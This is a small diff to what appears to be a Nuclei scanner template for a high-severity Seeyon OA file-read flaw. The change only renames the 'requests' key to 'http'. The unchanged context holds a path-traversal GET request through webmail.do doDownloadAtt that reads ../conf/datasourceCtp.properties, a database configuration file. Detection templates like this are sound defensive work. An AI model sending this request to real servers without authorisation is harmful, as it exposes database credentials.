@@ -6,7 +6,7 @@ info:
   severity: high
   tags: zhiyuan,fileRead
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties"
